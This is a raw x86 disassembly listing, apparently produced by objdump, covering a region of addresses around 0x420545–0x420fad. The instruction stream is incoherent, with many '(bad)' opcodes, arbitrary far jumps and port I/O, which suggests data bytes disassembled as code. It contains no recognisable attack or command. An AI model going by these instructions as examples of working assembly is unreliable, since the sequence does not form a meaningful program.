  420545:	sbb    BYTE PTR [eax+0x50de857],dh
  42054b:	int    0x69
  42054d:	pop    edi
  42054e:	sub    edx,edi
  420550:	shr    BYTE PTR [edi+ebp*1+0x1c2464e0],cl
  420557:	jns    0x420526
  420559:	sub    al,0x71
  42055b:	jp     0x420537
  42055d:	push   ds
  42055e:	xor    bl,bh
  420560:	mov    bl,0x7c
  420562:	sbb    eax,0x167e3fbc
  420567:	call   0x6102ed56
  42056c:	loopne 0x4205a7
  42056e:	add    eax,0x9dc11546
  420573:	add    eax,0x5ab0a504
  420578:	mov    esi,0x860ff19d
  42057d:	and    ch,bh
  42057f:	(bad)  
  420580:	repnz adc ebp,DWORD PTR [esi]
  420583:	lds    edi,FWORD PTR [edi-0xc]
  420586:	cmp    eax,esp
  420588:	fs mov bl,0xe2
  42058b:	imul   eax,DWORD PTR [eax-0x578c6784],0x32653f5d
  420595:	pop    es
  420596:	sar    DWORD PTR [ebx-0x56],0x40
  42059a:	lea    ebx,[edx]
  42059c:	push   ds
  42059d:	mov    bl,0x57
  42059f:	nop
  4205a0:	jmp    0xff73:0x4898f146
  4205a7:	iret   
  4205a8:	dec    ebp
  4205a9:	push   ecx
  4205aa:	adc    DWORD PTR [bx],ecx
  4205ad:	sar    DWORD PTR [esi+edx*8-0x2b2f8665],cl
  4205b4:	adc    al,0x80
  4205b6:	adc    bl,BYTE PTR [ebx-0x14]
  4205b9:	daa    
  4205ba:	loope  0x42060d
  4205bc:	jbe    0x4205c6
  4205be:	xchg   edi,eax
  4205bf:	pop    ss
  4205c0:	cs out 0xfa,eax
  4205c3:	fxch   st(0)
  4205c5:	inc    ebx
  4205c6:	adc    DWORD PTR [edi],esi
  4205c8:	ror    BYTE PTR [ebx+0x13a8ce22],cl
  4205ce:	ins    DWORD PTR es:[edi],dx
  4205cf:	leave  
  4205d0:	sub    BYTE PTR gs:[esp+esi*1+0x53],dh
  4205d5:	cmp    bl,ah
  4205d7:	neg    ah
  4205d9:	mov    eax,ds:0x8f77151
  4205de:	xor    al,0x9e
  4205e0:	dec    ebp
  4205e1:	lock pop edx
  4205e3:	push   esi
  4205e4:	rcr    DWORD PTR [edx+0x10198316],cl
  4205ea:	cmp    al,0x8d
  4205ec:	adc    bh,BYTE PTR ds:0xe22dd0e0
  4205f2:	or     BYTE PTR [ecx-0x32],ch
  4205f5:	adc    DWORD PTR [eax],esi
  4205f7:	and    eax,0xe6e066d9
  4205fc:	inc    ebp
  4205fd:	cmc    
  4205fe:	xchg   ecx,eax
  4205ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420600:	imul   edx,DWORD PTR [esi],0xce5af8bf
  420606:	outs   dx,BYTE PTR ds:[esi]
  420607:	test   BYTE PTR [edi-0x6784f2c1],dh
  42060d:	push   0x48
  42060f:	ja     0x420611
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	mov    ah,0xf4
  420682:	addr16 xchg al,dh
  420685:	pop    eax
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	pusha  
  42068d:	sub    al,0xe9
  42068f:	test   BYTE PTR [edi-0x3d351276],ah
  420695:	mov    ecx,0xcc9d0f08
  42069a:	dec    ebp
  42069b:	inc    eax
  42069c:	xor    eax,eax
  42069e:	pop    edx
  42069f:	xor    BYTE PTR [ecx],al
  4206a1:	in     al,0xac
  4206a3:	popf   
  4206a4:	mov    edi,0x8c9a3b3e
  4206a9:	loope  0x420718
  4206ab:	ins    BYTE PTR es:[edi],dx
  4206ac:	icebp  
  4206ad:	xchg   ch,bh
  4206af:	dec    ecx
  4206b0:	jge    0x4206ec
  4206b2:	repz leave 
  4206b4:	push   ecx
  4206b5:	push   esp
  4206b6:	out    0x56,al
  4206b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b9:	test   eax,0xec8622ae
  4206be:	(bad)  
  4206bf:	ja     0x4206c6
  4206c1:	push   es
  4206c2:	in     eax,dx
  4206c3:	sbb    al,0xbb
  4206c5:	fadd   DWORD PTR [ebx+0x195f7610]
  4206cb:	push   esi
  4206cc:	mov    esp,0xac1cdfb7
  4206d1:	mov    dl,0x70
  4206d3:	in     al,dx
  4206d4:	pop    eax
  4206d5:	pop    esi
  4206d6:	xor    BYTE PTR [eax+0x57e6af85],0xb8
  4206dd:	adc    eax,0xa38b637e
  4206e2:	pop    eax
  4206e3:	add    DWORD PTR [ebx-0x50],eax
  4206e6:	and    ebx,esp
  4206e8:	jmp    FWORD PTR [edx-0x10c009f]
  4206ee:	mov    eax,DWORD PTR [edx-0x6f2d3562]
  4206f4:	sub    BYTE PTR [eax-0x2],ch
  4206f7:	or     esp,0xdabfe7b0
  4206fd:	loopne 0x42073e
  4206ff:	repz sbb ah,BYTE PTR [ecx-0x6d]
  420703:	jb     0x4206ed
  420705:	imul   esp,DWORD PTR [edi+0x68],0x8e3794e4
  42070c:	dec    eax
  42070d:	call   0xaa54:0x7dd37de7
  420714:	mov    cl,0x43
  420716:	cld    
  420717:	mov    ds:0xd7604e27,eax
  42071c:	int    0x1c
  42071e:	rcr    DWORD PTR [edi+0x17],1
  420721:	mov    ecx,0x2b185b50
  420726:	jp     0x4206c3
  420728:	pop    edi
  420729:	ficom  WORD PTR [ecx+ecx*1-0x4ea71945]
  420730:	in     eax,0x93
  420732:	shl    BYTE PTR [esi-0x43],cl
  420735:	xlat   BYTE PTR ds:[ebx]
  420736:	clc    
  420737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420738:	pop    ebp
  420739:	pop    esi
  42073a:	popf   
  42073b:	and    DWORD PTR [ebp+0x70f68e70],ebp
  420741:	mov    WORD PTR [edi],cs
  420743:	mov    ah,0xe9
  420745:	push   edx
  420746:	mov    edx,0x142acf4c
  42074b:	xor    al,0xd9
  42074d:	push   es
  42074e:	pop    ebx
  42074f:	dec    esp
  420750:	rol    BYTE PTR [ebx+0x4c],1
  420753:	retf   0xefdd
  420756:	dec    esp
  420757:	fcomp  QWORD PTR [esi]
  420759:	enter  0x940f,0x73
  42075d:	call   0x8763:0xdd2a1243
  420764:	push   ss
  420765:	push   ds
  420766:	je     0x420730
  420768:	and    ecx,ebp
  42076a:	jns    0x4206fb
  42076c:	test   eax,0x5cef731c
  420771:	retf   
  420772:	mov    ecx,DWORD PTR [eax-0x52]
  420775:	int3   
  420776:	outs   dx,DWORD PTR ds:[esi]
  420777:	sbb    al,0x25
  420779:	(bad)  [edi-0x72b56848]
  42077f:	jae    0x4207e5
  420781:	in     eax,0xfe
  420783:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420785:	das    
  420786:	xchg   edx,eax
  420787:	outs   dx,BYTE PTR ds:[esi]
  420788:	mov    ah,0x48
  42078a:	dec    esp
  42078b:	xchg   edi,eax
  42078c:	mov    cl,0xdc
  42078e:	das    
  42078f:	add    eax,DWORD PTR [eax]
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	in     eax,dx
  420801:	ss inc esi
  420803:	test   eax,0x159f4
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	pushf  
  42080d:	retf   0x56c4
  420810:	xor    esp,DWORD PTR [edi+0x3]
  420813:	push   ebx
  420814:	ret    0x1ebb
  420817:	ret    
  420818:	inc    eax
  420819:	cli    
  42081a:	jmp    0x42081f
  42081c:	fidiv  DWORD PTR [edi]
  42081e:	mov    ss,edx
  420820:	jno    0x42083e
  420822:	jae    0x4207c8
  420824:	mov    dl,BYTE PTR [esi-0x22]
  420827:	sbb    BYTE PTR [ecx-0x4c],0x48
  42082b:	int    0x76
  42082d:	(bad)  
  42082e:	shr    dh,0x79
  420831:	cmc    
  420832:	aam    0xf4
  420834:	sar    DWORD PTR [esi+0x77],cl
  420837:	mov    eax,0x9ab13275
  42083c:	push   ebp
  42083d:	mov    ah,BYTE PTR [eax-0x703b3e4d]
  420843:	xlat   BYTE PTR ds:[ebx]
  420844:	mov    eax,ds:0x30193579
  420849:	xchg   ecx,eax
  42084a:	xchg   ebx,eax
  42084b:	int    0xe6
  42084d:	in     al,dx
  42084e:	int3   
  42084f:	ret    0x2101
  420852:	inc    ebp
  420853:	test   BYTE PTR [eax+ebp*4],ah
  420856:	dec    eax
  420857:	xor    DWORD PTR [ecx-0x80],edx
  42085a:	dec    ebp
  42085b:	shl    BYTE PTR [eax+0x4fa51400],1
  420861:	sub    ebp,DWORD PTR [ebp-0x33]
  420864:	repz loopne 0x4207e9
  420867:	adc    DWORD PTR [esi+ebx*1],edx
  42086a:	mov    dh,BYTE PTR [ebx+0x28b20e92]
  420870:	and    DWORD PTR [ecx+0xcd30541],ebx
  420876:	push   0x3b
  420878:	adc    BYTE PTR [esi+0x46],0xa3
  42087c:	popf   
  42087d:	fistp  WORD PTR [esi-0x6e]
  420880:	jmp    0xa69144b5
  420885:	sub    eax,0x6d099361
  42088a:	clc    
  42088b:	inc    edx
  42088c:	int3   
  42088d:	jno    0x4208a7
  42088f:	jmp    0x4208f5
  420891:	cwde   
  420892:	in     eax,0xe3
  420894:	mov    BYTE PTR [edx+0x5a],ch
  420897:	push   ecx
  420898:	(bad)  
  420899:	mov    ?,WORD PTR [ebp+0x113f0090]
  42089f:	adc    al,0xa6
  4208a1:	push   DWORD PTR [ebx+0x10]
  4208a4:	push   0x7f
  4208a6:	sahf   
  4208a7:	outs   dx,DWORD PTR ds:[esi]
  4208a8:	clc    
  4208a9:	jge    0x4208e6
  4208ab:	sbb    eax,0x51cd502a
  4208b0:	pop    edx
  4208b1:	rol    edx,cl
  4208b3:	push   esp
  4208b4:	mov    esp,0x71b6ffe1
  4208b9:	dec    esi
  4208ba:	iret   
  4208bb:	cmp    BYTE PTR [edx],0x6
  4208be:	sti    
  4208bf:	repnz (bad) 
  4208c1:	cmp    eax,0x2a832a4c
  4208c6:	je     0x420907
  4208c8:	(bad)  
  4208c9:	popa   
  4208ca:	bound  ebp,QWORD PTR [edx-0x6e]
  4208cd:	fs pop eax
  4208cf:	mov    esp,0xc3304541
  4208d4:	and    eax,0xba4bdcee
  4208d9:	mov    ds:0x833cfdd0,al
  4208de:	sbb    ecx,DWORD PTR [esi-0x600b8cee]
  4208e4:	pop    esi
  4208e5:	inc    ebp
  4208e6:	fist   DWORD PTR [eax-0x79cc7ed5]
  4208ec:	out    dx,al
  4208ed:	pop    ss
  4208ee:	not    BYTE PTR [edi+edx*1]
  4208f1:	pop    eax
  4208f2:	call   0x1d7:0x2dffb379
  4208f9:	pop    esp
  4208fa:	mov    esi,0x7b0b868d
  4208ff:	lods   eax,DWORD PTR ds:[esi]
  420900:	cdq    
  420901:	jg     0x42091c
  420903:	pop    DWORD PTR [edi-0x38]
  420906:	xchg   esp,eax
  420907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420908:	aas    
  420909:	clc    
  42090a:	mov    al,ds:0x2ef98cad
  42090f:	fiadd  WORD PTR [eax]
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x8e
  420981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420982:	in     al,dx
  420983:	psubb  mm3,QWORD PTR [edx+0x1]
  420987:	add    BYTE PTR [ecx+eax*1],al
  42098a:	add    BYTE PTR [eax],al
  42098c:	jg     0x420920
  42098e:	imul   ecx,DWORD PTR [eax+esi*8+0x4f85ccb9],0x9d9a28f9
  420999:	jle    0x420995
  42099b:	retf   
  42099c:	std    
  42099d:	in     eax,0x67
  42099f:	outs   dx,BYTE PTR ds:[esi]
  4209a0:	shl    DWORD PTR [eax+0x77],0x8d
  4209a4:	push   ebp
  4209a5:	fcomp  QWORD PTR [bx+di]
  4209a8:	cld    
  4209a9:	cmp    esp,ecx
  4209ab:	ins    DWORD PTR es:[edi],dx
  4209ac:	xchg   DWORD PTR [edx-0x477e7543],esp
  4209b2:	lods   eax,DWORD PTR ds:[esi]
  4209b3:	adc    al,0x16
  4209b5:	mov    ebx,0x42541d06
  4209ba:	jae    0x4209c2
  4209bc:	xchg   ebx,eax
  4209bd:	std    
  4209be:	stos   BYTE PTR es:[edi],al
  4209bf:	enter  0xa6cb,0x46
  4209c3:	jnp    0x420a3a
  4209c5:	arpl   WORD PTR [edi-0x790a75d8],ax
  4209cb:	mov    cs,WORD PTR ds:0x18360418
  4209d1:	fistp  QWORD PTR [eax+edx*8-0x51]
  4209d5:	pslld  mm3,QWORD PTR [ebx+eax*1+0x46]
  4209da:	jmp    0x4209c9
  4209dc:	mov    esp,0x2faa4b58
  4209e1:	and    DWORD PTR [esi-0x41419c93],ecx
  4209e7:	(bad)  
  4209e9:	mov    esi,0xa38a4bfb
  4209ee:	xchg   edi,eax
  4209ef:	in     al,dx
  4209f0:	push   esi
  4209f1:	xor    BYTE PTR ds:[ecx-0x6dd10096],cl
  4209f8:	aaa    
  4209f9:	lahf   
  4209fa:	retf   0xb696
  4209fd:	add    cl,BYTE PTR [edi+0x76]
  420a00:	in     eax,dx
  420a01:	dec    ebx
  420a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a03:	and    ah,0x80
  420a06:	fwait
  420a07:	aas    
  420a08:	test   al,0x6b
  420a0a:	mov    bl,ah
  420a0c:	mov    dl,0x0
  420a0e:	dec    ecx
  420a0f:	sub    DWORD PTR [esi],esi
  420a11:	popf   
  420a12:	mov    edx,DWORD PTR [ebp+0x3c]
  420a15:	ja     0x420a12
  420a17:	outs   dx,DWORD PTR ds:[esi]
  420a18:	out    dx,al
  420a19:	xchg   esi,eax
  420a1a:	sub    al,0xeb
  420a1c:	mov    dl,0x4b
  420a1e:	(bad)  
  420a1f:	jo     0x420a16
  420a21:	inc    esp
  420a22:	out    0xf9,al
  420a24:	and    eax,0xf314aeb1
  420a29:	or     bl,dl
  420a2b:	pop    ebx
  420a2c:	inc    DWORD PTR [edx]
  420a2e:	add    eax,DWORD PTR [eax-0x19d4682a]
  420a34:	pop    es
  420a35:	test   DWORD PTR [ebp-0x72],0xd4440c14
  420a3c:	mov    cl,0x5
  420a3e:	jl     0x4209d5
  420a40:	sbb    ebx,DWORD PTR [edi+0x31a6560d]
  420a46:	xchg   esi,eax
  420a47:	cmp    ebp,DWORD PTR [ebx]
  420a49:	nop
  420a4a:	sub    al,BYTE PTR [ebp+0x312e2530]
  420a50:	icebp  
  420a51:	dec    esi
  420a52:	jle    0x420a6f
  420a54:	add    eax,0x2da6451f
  420a59:	arpl   WORD PTR [ebx],bx
  420a5b:	mov    es,WORD PTR [ebp+0x48bb7c94]
  420a61:	xlat   BYTE PTR ds:[ebx]
  420a62:	enter  0x52d6,0x67
  420a66:	inc    edi
  420a67:	enter  0x1f66,0x1c
  420a6b:	mov    ds:0x38b19f35,al
  420a70:	inc    esi
  420a71:	stos   BYTE PTR es:[edi],al
  420a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a73:	outs   dx,DWORD PTR ds:[esi]
  420a74:	or     ah,BYTE PTR [ecx+edi*8]
  420a77:	lods   eax,DWORD PTR ds:[esi]
  420a78:	jmp    0x420ac3
  420a7a:	and    cl,dh
  420a7c:	mov    ecx,0x55261fc4
  420a81:	push   edi
  420a82:	lea    esp,[edx-0x45ac41fb]
  420a88:	xor    BYTE PTR [edi],al
  420a8a:	mov    ecx,0x13213ed5
  420a8f:	adc    al,0x0
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	je     0x420b6c
  420b02:	jg     0x420b0b
  420b04:	cld    
  420b05:	pop    ebx
  420b06:	add    DWORD PTR [eax],eax
  420b08:	add    al,0x1
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	aas    
  420b0d:	or     cl,bl
  420b0f:	clc    
  420b10:	ret    0xdc31
  420b13:	and    DWORD PTR [edx],edx
  420b15:	ret    
  420b16:	push   ss
  420b17:	jecxz  0x420b30
  420b19:	bound  edx,QWORD PTR fs:[edx]
  420b1c:	mov    al,ds:0xf0594960
  420b21:	and    cl,BYTE PTR [eax-0x15]
  420b24:	retf   0x669f
  420b27:	rcl    DWORD PTR [edi+edx*8-0x25865f13],1
  420b2e:	ins    DWORD PTR es:[edi],dx
  420b2f:	dec    ebx
  420b30:	test   BYTE PTR [edi],bl
  420b32:	int3   
  420b33:	int3   
  420b34:	xchg   BYTE PTR [ebx],al
  420b36:	test   cl,cl
  420b38:	inc    esi
  420b39:	loope  0x420b8b
  420b3b:	imul   esp,esp,0xed6b7dc4
  420b41:	jno    0x420b52
  420b43:	dec    eax
  420b44:	sti    
  420b45:	mov    ebx,0xf78cce94
  420b4a:	fisubr DWORD PTR [edi]
  420b4c:	jbe    0x420bb4
  420b4e:	xchg   edi,eax
  420b4f:	xchg   esi,eax
  420b50:	aaa    
  420b51:	dec    eax
  420b52:	jae    0x420ada
  420b54:	stos   DWORD PTR es:[edi],eax
  420b55:	shl    BYTE PTR [ebp-0x6633ba94],cl
  420b5b:	fidivr WORD PTR [edi+0x22eabe83]
  420b61:	adc    eax,DWORD PTR [edi-0x26]
  420b64:	aad    0xca
  420b66:	inc    ebx
  420b67:	mov    WORD PTR [esi*2+0x32e5c639],?
  420b6e:	int3   
  420b6f:	xor    ebx,DWORD PTR [edi+0x4b]
  420b72:	adc    eax,0x50596c70
  420b77:	les    esi,FWORD PTR [ebx-0x33]
  420b7a:	stos   BYTE PTR es:[edi],al
  420b7b:	and    edx,esi
  420b7d:	add    bh,BYTE PTR [esi-0x2ef816cd]
  420b83:	inc    ecx
  420b84:	fnstsw WORD PTR [eax-0x11]
  420b87:	nop
  420b88:	add    eax,0xe99353a5
  420b8d:	(bad)  ds:0x72fcf838
  420b93:	mov    al,0x4e
  420b95:	inc    edi
  420b96:	cs jnp 0x420bc0
  420b99:	ds int 0xeb
  420b9c:	pop    es
  420b9d:	out    0x31,eax
  420b9f:	add    al,0xa9
  420ba1:	push   ss
  420ba2:	pop    eax
  420ba3:	xor    DWORD PTR [esi+eax*4+0x40],esp
  420ba7:	iret   
  420ba8:	cwde   
  420ba9:	push   edi
  420baa:	xor    esi,DWORD PTR [ecx]
  420bac:	push   cs
  420bad:	cmc    
  420bae:	mov    ch,0x32
  420bb0:	imul   ebp,DWORD PTR ss:[edi+eiz*4+0x7b2efb5c],0xf
  420bb9:	pop    esp
  420bba:	dec    ebx
  420bbb:	and    al,0x4e
  420bbd:	fdivp  st(0),st
  420bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bc0:	push   ebx
  420bc1:	ret    0x532e
  420bc4:	out    0x1a,al
  420bc6:	mov    esp,0x9c417f95
  420bcb:	add    ebx,DWORD PTR [edi-0x61]
  420bce:	int    0xb8
  420bd0:	push   ds
  420bd1:	mov    edx,0x4d59f6d4
  420bd6:	jmp    0xe989f443
  420bdb:	lahf   
  420bdc:	mov    bh,0x36
  420bde:	sbb    eax,DWORD PTR es:[edx-0x7f]
  420be2:	sbb    al,0x84
  420be4:	mov    ebx,0x2b88ec6d
  420be9:	data16 fwait
  420beb:	scas   al,BYTE PTR es:[edi]
  420bec:	sub    al,0x96
  420bee:	cmp    edi,ebp
  420bf0:	dec    ebp
  420bf1:	sahf   
  420bf2:	lock imul eax,eax,0xf0bcfbab
  420bf9:	sub    BYTE PTR [ebx+0x2937d8f],dl
  420bff:	bound  ecx,QWORD PTR [edx+0x640859c]
  420c05:	test   eax,0x19be0276
  420c0a:	aaa    
  420c0b:	loope  0x420c73
  420c0d:	inc    edx
  420c0e:	inc    edx
  420c0f:	mov    eax,DWORD PTR [eax]
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c81:	dec    esp
  420c82:	ds dec esp
  420c84:	add    BYTE PTR [ebp+0x1],bl
  420c87:	add    BYTE PTR [ecx+eax*1],al
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	pop    ebp
  420c8d:	shl    BYTE PTR ds:0xbe8598af,cl
  420c93:	in     eax,dx
  420c94:	fsubr  DWORD PTR [eax]
  420c96:	hlt    
  420c97:	mov    dl,0x88
  420c99:	sub    al,0xe2
  420c9b:	loop   0x420cd6
  420c9d:	stos   BYTE PTR es:[edi],al
  420c9e:	mov    ds:0x434a57cd,eax
  420ca3:	xchg   BYTE PTR [ebp+0x73fd9c00],dh
  420ca9:	sbb    eax,DWORD PTR [edx+0x24]
  420cac:	mov    al,ds:0x93521aab
  420cb1:	ret    
  420cb2:	cwde   
  420cb3:	ja     0x420cc7
  420cb5:	scas   al,BYTE PTR es:[edi]
  420cb6:	stc    
  420cb7:	and    DWORD PTR [ebx+eax*1-0x56],0xfc5a789c
  420cbf:	xor    BYTE PTR [edi+0x4e54ec99],cl
  420cc5:	or     bl,BYTE PTR [ecx+0x3e]
  420cc8:	rol    DWORD PTR [ebp-0xf],1
  420ccb:	mov    ds:0x91cf51c0,al
  420cd0:	jge    0x420d38
  420cd2:	inc    eax
  420cd3:	popa   
  420cd4:	adc    al,0x44
  420cd6:	push   ss
  420cd7:	pop    esp
  420cd8:	xlat   BYTE PTR ds:[ebx]
  420cd9:	arpl   WORD PTR [ecx+0x5234ef7e],bx
  420cdf:	enter  0x270b,0x6b
  420ce3:	adc    ch,BYTE PTR [eax+ebp*8-0x4f]
  420ce7:	stos   DWORD PTR es:[edi],eax
  420ce8:	fisub  DWORD PTR [esp]
  420ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cec:	std    
  420ced:	jle    0x420cd6
  420cef:	mov    eax,0x2f196870
  420cf4:	fxrstor [esi-0x6b]
  420cf8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420cfa:	jge    0x420d11
  420cfc:	sti    
  420cfd:	inc    edi
  420cfe:	das    
  420cff:	or     DWORD PTR [ecx+0x37],esp
  420d02:	shr    esi,cl
  420d04:	(bad)
  420d07:	jge    0x420cd4
  420d09:	dec    esi
  420d0a:	pop    eax
  420d0b:	xchg   edi,eax
  420d0c:	imul   edx,DWORD PTR [ebp-0x2d],0xfffffff9
  420d10:	addr16 hlt 
  420d12:	sub    esi,esp
  420d14:	je     0x420d65
  420d16:	add    dh,0x5a
  420d19:	mov    ?,WORD PTR [edx]
  420d1b:	mov    ebx,0xe8abfc61
  420d20:	std    
  420d21:	rol    DWORD PTR [edx],0x45
  420d24:	fiadd  WORD PTR [ecx-0x49]
  420d27:	adc    bl,ah
  420d29:	pop    es
  420d2a:	add    al,0x13
  420d2c:	and    al,0xf5
  420d2e:	dec    ecx
  420d2f:	sbb    eax,0x52259834
  420d34:	inc    esi
  420d35:	fimul  WORD PTR [ebp-0x66aa5d84]
  420d3b:	rcl    DWORD PTR [eax],1
  420d3d:	mov    ebp,0xb523558b
  420d42:	xor    dl,BYTE PTR [edx]
  420d44:	mov    eax,0x63ff480e
  420d49:	jle    0x420d4f
  420d4b:	pop    ds
  420d4c:	mov    ecx,0xb0d85a78
  420d51:	xor    BYTE PTR [eax],0x93
  420d54:	sbb    dh,al
  420d56:	(bad)  
  420d57:	mov    edi,0x3972f877
  420d5c:	jge    0x420da5
  420d5e:	retf   
  420d5f:	mov    al,0x0
  420d61:	xchg   BYTE PTR [eax-0x69],ch
  420d64:	loop   0x420d5e
  420d66:	fwait
  420d67:	clc    
  420d68:	cmp    al,0xcd
  420d6a:	xor    esp,edx
  420d6c:	adc    al,0x39
  420d6e:	jns    0x420d81
  420d70:	cdq    
  420d71:	jle    0x420db5
  420d73:	aad    0x3d
  420d75:	xchg   edx,eax
  420d76:	mov    ds:0x9d3ec0a1,eax
  420d7b:	(bad)  
  420d7c:	jle    0x420d4d
  420d7e:	add    eax,0x8fe865da
  420d83:	pop    cx
  420d85:	in     eax,dx
  420d86:	lahf   
  420d87:	into   
  420d88:	(bad)  
  420d8a:	popf   
  420d8b:	sbb    bh,0xfa
  420d8e:	loop   0x420d6c
	...
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xbba6a56e
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	out    0x5d,al
  420e0e:	and    ebp,DWORD PTR [edx-0x53563b99]
  420e14:	arpl   WORD PTR [esi+0x65ce5e9c],si
  420e1a:	and    DWORD PTR [ebx+0x15],esi
  420e1d:	cvtps2pd xmm3,QWORD PTR [ecx]
  420e20:	push   ds
  420e21:	call   0x258a:0x742628f4
  420e28:	or     eax,0x22103bb3
  420e2d:	(bad)  
  420e2e:	pop    es
  420e2f:	xlat   BYTE PTR ds:[ebx]
  420e30:	outs   dx,DWORD PTR ds:[esi]
  420e31:	popa   
  420e32:	loopne 0x420db7
  420e34:	popa   
  420e35:	jns    0x420ea7
  420e37:	outs   dx,DWORD PTR ds:[esi]
  420e38:	push   es
  420e39:	cmp    BYTE PTR [ebx*8+0x52f70339],ch
  420e40:	icebp  
  420e41:	sub    BYTE PTR [eax-0x1f9da634],0xb0
  420e48:	mov    edi,0x8f6910df
  420e4d:	jecxz  0x420dd7
  420e4f:	mov    ds:0x21dfabbc,al
  420e54:	(bad)  
  420e55:	leave  
  420e56:	jae    0x420e24
  420e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e59:	pop    edx
  420e5b:	jp     0x420e7f
  420e5d:	repnz fist DWORD PTR [edi+0x6b5194c2]
  420e64:	mov    eax,0xc4734ea8
  420e69:	jecxz  0x420eb1
  420e6b:	test   DWORD PTR [esi+0x4],ebx
  420e6e:	mov    ecx,0x476466a1
  420e73:	adc    al,0x22
  420e75:	mov    edi,0x13747695
  420e7a:	pop    edi
  420e7b:	mov    ebx,0x3eb6bda2
  420e80:	ins    DWORD PTR es:[edi],dx
  420e81:	jp     0x420e32
  420e83:	push   eax
  420e84:	mov    ch,0x26
  420e86:	addr16 ret 0x180a
  420e8a:	pop    ss
  420e8b:	clc    
  420e8c:	popa   
  420e8d:	mov    eax,ds:0x6fe3a774
  420e92:	mov    BYTE PTR [edi+edi*4+0x3983cd73],bh
  420e99:	shr    DWORD PTR [edi*4+0x6c9111b2],0x8e
  420ea1:	push   ecx
  420ea2:	addr16 sub eax,0x8c487853
  420ea8:	mov    ds:0xcab074b3,al
  420ead:	pop    ebx
  420eae:	hlt    
  420eaf:	xchg   ebp,eax
  420eb0:	repnz cmp ebp,ebx
  420eb3:	jbe    0x420eec
  420eb5:	or     BYTE PTR [eax+edx*8+0x6f55627e],ah
  420ebc:	stos   DWORD PTR es:[edi],eax
  420ebd:	mov    edx,0xa985020e
  420ec2:	sbb    ch,BYTE PTR [ebx-0x68bd7749]
  420ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ec9:	jg     0x420e4e
  420ecb:	inc    ebp
  420ecc:	(bad)  
  420ece:	(bad)  
  420ecf:	(bad)  
  420ed0:	sub    dl,bh
  420ed2:	push   ebx
  420ed3:	and    DWORD PTR [eax+ebx*2],ebx
  420ed6:	xchg   BYTE PTR [ebp-0x5a],al
  420ed9:	push   es
  420eda:	jmp    0xd09bd51c
  420edf:	in     eax,0x63
  420ee1:	in     al,dx
  420ee2:	xor    al,0xb7
  420ee4:	ret    0xfb74
  420ee7:	or     esi,esp
  420ee9:	mov    al,0xbb
  420eeb:	mov    bl,0x5c
  420eed:	lds    edi,FWORD PTR ds:0xfdab403c
  420ef3:	mov    ds:0x22839949,al
  420ef8:	mov    ah,0x4
  420efa:	ins    BYTE PTR es:[edi],dx
  420efb:	mov    bl,0xba
  420efd:	sbb    ebx,DWORD PTR [ebp+edx*2-0x2a57a246]
  420f04:	in     al,dx
  420f05:	div    BYTE PTR [esi]
  420f07:	sub    eax,0xb5497857
  420f0c:	mov    ah,bl
  420f0e:	stos   DWORD PTR es:[edi],eax
  420f0f:	loop   0x420f11
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x2a579f80]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	push   eax
  420f8d:	shr    BYTE PTR [ebx+0x69],0xe3
  420f91:	mov    BYTE PTR [ebp+0x43],dh
  420f94:	adc    cl,BYTE PTR [ecx-0x27eb0eec]
  420f9a:	mov    esi,0x8e34abf3
  420f9f:	jno    0x420feb
  420fa1:	mov    ds:0xc2b2fcac,al
  420fa6:	call   0xb8b:0xb04edf6f
  420fad:	in     al,0x73
